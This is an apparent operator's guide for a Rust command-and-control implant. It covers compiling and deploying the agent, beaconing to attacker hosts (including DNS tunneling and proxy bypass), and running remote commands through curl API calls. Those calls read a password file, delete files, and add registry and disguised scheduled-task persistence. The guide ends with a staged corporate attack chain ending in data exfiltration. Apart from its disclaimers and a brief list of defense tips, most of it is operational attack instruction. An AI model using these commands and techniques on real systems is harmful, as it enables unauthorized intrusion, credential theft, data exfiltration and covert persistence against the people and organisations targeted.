# 🎯 Operational Guide - Complete Deployment & Control

**Version:** 1.0.0  
**Status:** Production Ready  
**Educational Purpose Only**

⚠️ **DISCLAIMER:** This guide is for authorized security testing and educational purposes only.

---

## 📋 Table of Contents

1. [Agent Compilation & Deployment](#agent-compilation--deployment)
2. [Network Deployment Strategies](#network-deployment-strategies)
3. [Monitoring & Detection](#monitoring--detection)
4. [Command Execution](#command-execution)
5. [Access & Persistence](#access--persistence)
6. [Troubleshooting](#troubleshooting)

---

## 🔨 Agent Compilation & Deployment

### **Step 1: Compile the Agent**

#### **Windows Binary**
```bash
# On Linux/Mac (cross-compile)
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu

# Output: agent/target/x86_64-pc-windows-gnu/release/agent.exe
# Size: ~2-3 MB (stripped)
```

#### **Linux Binary**
```bash
cargo build --release
# Output: agent/target/release/agent
# Size: ~1.6 MB (stripped)
```

#### **macOS Binary**
```bash
cargo build --release --target x86_64-apple-darwin
# Output: agent/target/x86_64-apple-darwin/release/agent
```

### **Step 2: Configure Agent**

#### **Environment Variables Method**
```bash
export SERVER_URL="https://your-c2-server.com:8000"
export ENCRYPTION_KEY="32-character-hex-key-here"
export AGENT_ID="target-hostname-001"
export BEACON_INTERVAL=30

./agent
```

#### **Configuration File Method**
```toml
# agent.config
server_url = "https://your-c2-server.com:8000"
encryption_key = "32-character-hex-key"
agent_id = "target-hostname-001"
beacon_interval = 30  # seconds
proxy_url = "http://proxy.corp.com:8080"  # optional
dns_domain = "beacon.attacker.com"        # optional
```

---

## 🌐 Network Deployment Strategies

### **Strategy 1: Direct Deployment (Internal Network)**

#### **Scenario:** Target in same network as C2 server

```
Step 1: Build Agent
┌─────────────────────────────┐
│ cargo build --release       │
└────────────┬────────────────┘
             │
Step 2: Copy to Target
             │
         ┌───▼────────────────────┐
         │ USB Drive / Network    │
         │ Share / Email          │
         └───┬────────────────────┘
             │
Step 3: Execute on Target
             │
         ┌───▼──────────────────────────────────┐
         │ target@server$ ./agent               │
         │ [*] Connecting to server...          │
         │ [✓] Connected!                       │
         │ [*] Starting beacon loop             │
         └───┬──────────────────────────────────┘
             │
Step 4: Agent Appears in Dashboard
             │
         ┌───▼──────────────────────────────────┐
         │ Dashboard:                           │
         │ • Total Agents: 1                    │
         │ • Active: target-001                 │
         │ • Status: Online                     │
         │ • Last Seen: Just Now                │
         └──────────────────────────────────────┘
```

#### **Configuration Example:**
```bash
# On target machine
export SERVER_URL="http://192.168.1.100:8000"
export AGENT_ID="DESKTOP-XYZ123"
./agent

# Output:
# ╔════════════════════════════════════════╗
# ║ 🦀 Secure Remote Agent v0.2.0         ║
# ║ Connecting to: http://192.168.1.100   ║
# ╚════════════════════════════════════════╝
# [INFO] Configuration loaded successfully
# [INFO] System information gathered
#   Hostname: DESKTOP-XYZ123
#   OS: Windows (10.0.19045)
#   Architecture: x86_64
# [INFO] Connecting to server...
# [INFO] Connected!
# [INFO] Starting beacon loop...
```

---

### **Strategy 2: Proxy-Based Deployment (Corporate)**

#### **Scenario:** Target behind corporate proxy

```
Target Machine
    ↓ (Proxy authentication required)
Proxy: proxy.corp.com:8080 (NTLM auth)
    ↓ (Encrypted tunnel)
C2 Server: api.attacker.com:443
```

#### **Configuration:**
```bash
export SERVER_URL="https://api.attacker.com:8000"
export PROXY_URL="proxy.corp.com:8080"
export PROXY_AUTH="NTLM:COMPANY\username:password"
export PROXY_METHOD="true"

./agent
```

#### **What Happens:**
```
Agent connects to proxy with credentials
    ↓
Sends CONNECT request: api.attacker.com:443
    ↓
Proxy validates credentials
    ↓
Proxy establishes tunnel to C2
    ↓
Agent receives WebSocket connection
    ↓
Encrypted communication through proxy
```

---

### **Strategy 3: DNS Tunneling (Restricted Network)**

#### **Scenario:** Only DNS (port 53) allowed outbound

```
Agent sends DNS query:
4d5a900a0102030405.beacon.attacker.com TXT

DNS Server resolves:
C2 Server (authoritative NS)
    ↓
Returns TXT record:
"Q0VVQU=="  (Base64 encoded response)
    ↓
Agent decodes and processes
```

#### **Configuration:**
```bash
export SERVER_URL="dns://beacon.attacker.com"
export DNS_SERVER="8.8.8.8"
export DNS_METHOD="true"
export DNS_ENCODING="base64"

./agent
```

#### **Command Flow:**
```
1. Agent wants to execute: whoami
2. Encodes to Base64: d2hvYW1p
3. Creates domain: d2hvYW1p.beacon.attacker.com
4. Sends DNS query to 8.8.8.8
5. Receives response in TXT record
6. Decodes and executes
7. Output: admin
8. Encodes output: YWRtaW4=
9. Sends response back via DNS
```

---

### **Strategy 4: SSH Jump Host**

#### **Scenario:** Access through SSH bastion

```
Target Machine
    ↓ (SSH tunnel)
Jump Host: jump.corp.com:22
    ↓ (Local port forward)
C2 Server: localhost:9000
```

#### **Configuration:**
```bash
export SERVER_URL="http://localhost:9000"
export SSH_HOST="jump.corp.com"
export SSH_USER="admin"
export SSH_KEY="/path/to/private/key"
export SSH_METHOD="true"

./agent
```

---

### **Strategy 5: P2P Relay Network**

#### **Scenario:** Multi-hop through compromised hosts

```
Target (Agent 1)
    ↓
Relay Host 1 (Agent 2)
    ↓
Relay Host 2 (Agent 3)
    ↓
Relay Host 3 (Agent 4)
    ↓
C2 Server
```

#### **Configuration:**
```bash
# On each relay agent
export RELAY_MODE="true"
export RELAY_PEERS="agent2:9000,agent3:9001,agent4:9002"

./agent
```

---

## 📊 Monitoring & Detection

### **Part 1: Verify Connection on Dashboard**

#### **Access Dashboard:**
```
URL: http://localhost:5173
Login: admin / password123
```

#### **What You'll See:**

**1. Main Dashboard**
```
┌─────────────────────────────────────────────┐
│ 📊 Dashboard Overview                       │
├─────────────────────────────────────────────┤
│                                             │
│ Total Agents: 1              Active: 1      │
│ Total Sessions: 0            Success Rate:  │
│ Total Commands: 0            Pending: 0     │
│                                             │
└─────────────────────────────────────────────┘
```

**2. Agents List**
```
Agents Tab:
┌─────────────────────────────────────────────┐
│ Agent ID          │ Status  │ Last Seen    │
├─────────────────────────────────────────────┤
│ DESKTOP-XYZ123    │ Online  │ Just now     │
│ Hostname: WIN10   │ OS: Win │ Arch: x86_64 │
│ IP: 192.168.1.50  │ User: admin            │
└─────────────────────────────────────────────┘
```

**3. Real-time Updates**
```
WebSocket Connection:
ws://localhost:8000/ws/agent

Messages:
{
  "type": "beacon",
  "agent_id": "DESKTOP-XYZ123",
  "timestamp": "2024-11-05T14:30:00Z",
  "status": "online",
  "hostname": "DESKTOP-XYZ123",
  "os": "Windows",
  "ip_address": "192.168.1.50"
}
```

### **Part 2: Server Logs**

#### **Check Server Logs:**
```bash
docker-compose logs server
# Or
tail -f server/logs/app.log
```

#### **What You'll See:**
```
[2024-11-05 14:30:00] INFO: Agent connected: DESKTOP-XYZ123
[2024-11-05 14:30:00] INFO: Session created: session_123
[2024-11-05 14:30:05] INFO: Beacon received from agent_xyz123
[2024-11-05 14:30:05] INFO: Agent status: online
```

### **Part 3: Detection Module**

#### **Check Detection Module:**
```bash
curl http://localhost:8001/api/stats
```

#### **Response:**
```json
{
  "network": {
    "total_connections": 1,
    "suspicious_activity": 0,
    "port_scans_detected": 0,
    "c2_patterns": 0
  },
  "behavior": {
    "total_processes": 45,
    "suspicious_processes": 0,
    "total_alerts": 0
  },
  "alerts": {
    "total_alerts": 0,
    "critical_alerts": 0,
    "open_alerts": 0
  }
}
```

---

## ⚙️ Command Execution

### **Step 1: Create Session**

```bash
curl -X POST http://localhost:8000/api/sessions \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "DESKTOP-XYZ123",
    "name": "Windows Target Server"
  }'
```

#### **Response:**
```json
{
  "id": "session_123",
  "agent_id": "DESKTOP-XYZ123",
  "status": "active",
  "created_at": "2024-11-05T14:30:00Z",
  "command_count": 0
}
```

### **Step 2: Execute Commands**

#### **Command 1: Get Current User**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "WhoAmI"
  }'
```

**Response:**
```json
{
  "id": "cmd_001",
  "status": "completed",
  "output": "COMPANY\\administrator\n",
  "error": null
}
```

#### **Command 2: System Information**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "SystemInfo"
  }'
```

**Response:**
```json
{
  "output": {
    "hostname": "DESKTOP-XYZ123",
    "os": "Windows 10",
    "os_version": "10.0.19045",
    "cpu_cores": 8,
    "memory": "16 GB",
    "uptime": "45 days",
    "users": ["admin", "user1", "service_account"]
  }
}
```

#### **Command 3: List Directory**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "ListDir",
    "args": {
      "path": "C:\\Users\\admin\\Documents"
    }
  }'
```

**Response:**
```json
{
  "output": [
    {
      "name": "passwords.txt",
      "type": "file",
      "size": 1024,
      "modified": "2024-11-01T12:00:00Z"
    },
    {
      "name": "Projects",
      "type": "directory",
      "size": 0,
      "modified": "2024-10-15T10:30:00Z"
    }
  ]
}
```

#### **Command 4: Read File**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "ReadFile",
    "args": {
      "path": "C:\\Users\\admin\\Documents\\passwords.txt"
    }
  }'
```

**Response:**
```json
{
  "output": "admin:P@ssw0rd123\nservice:Service123!\nuser1:User1Pass\n"
}
```

#### **Command 5: Execute Shell Command**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "Execute",
    "args": {
      "command": "ipconfig /all",
      "timeout": 30
    }
  }'
```

**Response:**
```json
{
  "output": "Windows IP Configuration\n\nEthernet adapter Ethernet:\n   Connection-specific DNS Suffix: corp.local\n   IPv4 Address: 192.168.1.50\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 192.168.1.1\n"
}
```

#### **Command 6: List Processes**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "ProcessList"
  }'
```

**Response:**
```json
{
  "processes": [
    {
      "pid": 4,
      "name": "System",
      "memory_mb": 50,
      "cpu_percent": 0.1
    },
    {
      "pid": 892,
      "name": "explorer.exe",
      "memory_mb": 250,
      "cpu_percent": 2.3
    },
    {
      "pid": 3456,
      "name": "notepad.exe",
      "memory_mb": 45,
      "cpu_percent": 0.5
    }
  ]
}
```

#### **Command 7: Get Network Info**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "NetworkInfo"
  }'
```

**Response:**
```json
{
  "interfaces": [
    {
      "name": "Ethernet",
      "ip": "192.168.1.50",
      "mac": "00:1A:2B:3C:4D:5E",
      "status": "up"
    }
  ],
  "connections": [
    {
      "local_ip": "192.168.1.50",
      "local_port": 443,
      "remote_ip": "8.8.8.8",
      "remote_port": 53,
      "state": "ESTABLISHED"
    }
  ]
}
```

#### **Command 8: Create Directory**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "CreateDir",
    "args": {
      "path": "C:\\Users\\admin\\AppData\\Local\\Temp\\hidden"
    }
  }'
```

#### **Command 9: Write File**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "WriteFile",
    "args": {
      "path": "C:\\Users\\admin\\AppData\\Local\\Temp\\script.ps1",
      "content": "Get-Process | Where-Object {$_.Handles -gt 1000} | Select-Object ProcessName, Handles"
    }
  }'
```

#### **Command 10: Delete File**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "DeleteFile",
    "args": {
      "path": "C:\\Users\\admin\\Documents\\sensitive.txt"
    }
  }'
```

---

## 🔑 Access & Persistence

### **Access Level 1: Reconnaissance**
```
✓ System information
✓ User accounts
✓ Installed software
✓ Network configuration
✓ Running processes
✓ File listings
```

### **Access Level 2: Data Exfiltration**
```
✓ Read files (passwords, configs, docs)
✓ List directories
✓ Copy files to accessible location
✓ Download via WebSocket
✓ Compress for faster transfer
```

### **Access Level 3: Lateral Movement**
```
✓ Network enumeration (find other systems)
✓ Port scanning (find services)
✓ Credential usage
✓ Share enumeration
✓ Service discovery
```

### **Access Level 4: Privilege Escalation**
```
✓ Detect privilege level
✓ Run commands as current user
✓ UAC bypass attempts
✓ Kernel exploitation
✓ Service abuse
```

### **Access Level 5: Persistence**
```
To maintain access:

1. Registry Run Keys:
   HKLM\Software\Microsoft\Windows\Run
   → Add agent.exe path

2. Scheduled Tasks:
   Create task that runs agent daily

3. Startup Folder:
   C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

4. Service Installation:
   Create Windows service for agent

5. WMI Event Subscription:
   Trigger on system startup
```

#### **Example: Add to Registry Run Key**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "Execute",
    "args": {
      "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v agent /t REG_SZ /d C:\\Windows\\System32\\agent.exe /f"
    }
  }'
```

#### **Example: Create Scheduled Task**
```bash
curl -X POST http://localhost:8000/api/commands \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "session_123",
    "type": "Execute",
    "args": {
      "command": "schtasks /create /tn \"Windows Update\" /tr \"C:\\Windows\\System32\\agent.exe\" /sc daily /st 02:00 /f"
    }
  }'
```

---

## 🚨 Real-World Scenario: Complete Attack Chain

### **Scenario: Compromising Corporate Network**

#### **Phase 1: Initial Access (Day 1)**
```
1. Deploy agent to target machine
   - Via USB
   - Via email attachment
   - Via malicious link
   
2. Agent connects to C2
   - Dashboard shows: "DESKTOP-FINANCE-01" Online
   
3. Gather information
   - WhoAmI → COMPANY\finance_user
   - SystemInfo → Windows 10, Finance Department
   - NetworkInfo → 192.168.2.50, on finance network
```

#### **Phase 2: Reconnaissance (Day 1-2)**
```
4. Enumerate network
   - PortScanner → Find open ports
   - NetworkEnum → Discover other hosts
   - Find: Database server, File server, AD server
   
5. Enumerate accessible shares
   - ListDir → Browse network shares
   - ReadFile → Find configuration files
   - Discover: passwords.txt, database_credentials.conf
```

#### **Phase 3: Lateral Movement (Day 2-3)**
```
6. Extract credentials
   - Read configuration files
   - Extract DB connection strings
   - Find service account passwords
   
7. Move to critical systems
   - Connect via discovered credentials
   - Deploy agent on database server
   - Deploy agent on file server
   - Deploy agent on domain controller
```

#### **Phase 4: Data Exfiltration (Day 3-4)**
```
8. Access valuable data
   - Financial records
   - Customer data
   - Source code
   - Trade secrets
   
9. Copy to exfil location
   - Create hidden folder
   - Copy sensitive files
   - Compress with 7z/Rar
   - Download via agent
```

#### **Phase 5: Persistence (Day 4)**
```
10. Ensure persistence
    - Add registry run keys
    - Create scheduled tasks
    - Install as service
    - Deploy on multiple systems
    
11. Maintain access
    - Monitor for changes
    - Reinject if cleaned
    - Escalate privileges
```

---

## 🔍 Dashboard Real-Time Monitoring

### **Live Command Execution Through Dashboard:**

```
Dashboard: Sessions Tab
┌────────────────────────────────────────────────┐
│ Session: DESKTOP-FINANCE-01                    │
├────────────────────────────────────────────────┤
│ Status: Active                                 │
│ Last Beacon: 5 seconds ago                     │
├────────────────────────────────────────────────┤
│ Command Input:                                 │
│ ┌──────────────────────────────────────────┐  │
│ │ whoami                                   │  │
│ │                                          │  │
│ │ ┌─ Execute ┐  ┌─ Copy ─┐  ┌─ Clear ┐   │  │
│ └──────────────────────────────────────────┘  │
│                                                │
│ Output:                                        │
│ ┌──────────────────────────────────────────┐  │
│ │ COMPANY\finance_user                     │  │
│ └──────────────────────────────────────────┘  │
│                                                │
│ Execution Time: 150ms                         │
│ Status: Success ✓                             │
└────────────────────────────────────────────────┘
```

---

## 📊 Troubleshooting Connection Issues

### **Issue 1: Agent Not Connecting**

```bash
# Check server is running
curl http://localhost:8000/health

# Check firewall
netstat -an | grep 8000

# Check agent logs
tail -f agent.log

# Verify network connectivity
ping c2-server.com
```

### **Issue 2: Firewall Blocking Connection**

```
Solution 1: Use DNS tunneling
export DNS_METHOD="true"

Solution 2: Use HTTP instead of HTTPS
export SERVER_URL="http://server:8000"

Solution 3: Use proxy
export PROXY_URL="proxy.corp.com:8080"
```

### **Issue 3: Agent Disconnecting**

```bash
# Check beacon interval
export BEACON_INTERVAL=30  # seconds

# Check timeout settings
export CONNECTION_TIMEOUT=60

# Enable reconnect with exponential backoff
export RECONNECT_ENABLED="true"
```

---

## 🔐 Security Notes

### **Defense Recommendations:**

1. **Network Monitoring**
   - Monitor for unusual outbound connections
   - Detect port scanning activity
   - Identify suspicious process creation

2. **Endpoint Detection**
   - Monitor process behavior
   - Detect file system modifications
   - Track registry changes

3. **Behavioral Analysis**
   - Detect command execution patterns
   - Monitor network communication patterns
   - Identify lateral movement attempts

4. **Incident Response**
   - Kill agent process immediately
   - Isolate infected system
   - Preserve forensic evidence
   - Block C2 infrastructure

---

**This guide covers the complete operational cycle - from initial deployment to full system compromise.** ⚠️

**All operations must be authorized and documented.**
